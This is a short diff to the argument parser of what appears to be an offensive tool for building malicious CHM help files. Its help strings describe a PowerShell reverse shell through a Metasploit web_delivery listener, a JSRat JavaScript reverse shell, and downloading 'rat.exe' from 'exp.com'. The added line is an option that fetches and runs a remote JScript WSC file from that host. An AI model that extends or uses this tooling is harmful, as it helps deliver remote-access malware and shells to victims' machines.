@@ -713,6 +713,7 @@ parser.add_argument('-p', '--payload', help='-p c:\\\windows\\\command')
 parser.add_argument('-r', '--rshell', help='-r http://192.168.0.100:8080，powershell reverse shell，need msf> exploit(web_delivery)')
 parser.add_argument('-j', '--jsrat', help='-j http://192.168.0.100:8000，JS reverse shell，need JSRat.py -i 192.168.0.100 -p 8000')
 parser.add_argument('-d', '--download', help='-d http://exp.com/rat.exe，lucky to see u Downloader!')
+parser.add_argument('-c', '--custom', help='-c http://exp.com/js.wsc，run a custom jscript wsc file')
 parser.add_argument('-o', '--outfile', help='-o exp.chm', default='exp.chm')
 parser.add_argument('-dec', '--decompile', help='decompile .CHM file to OUT directory')
 
@@ -725,7 +726,7 @@ parser.add_argument('-ic2', '--index2_content', help='-ic2 任意填充文件', 
 args=parser.parse_args()
 
 php_htm=php_htm_default
-if args.index2_content != php_htm_default: #如果不等於默認==如果輸入了命令
+if args.index2_content != php_htm_default:
     php_htm=''
     with open(args.index2_content) as f:
         for line in f:
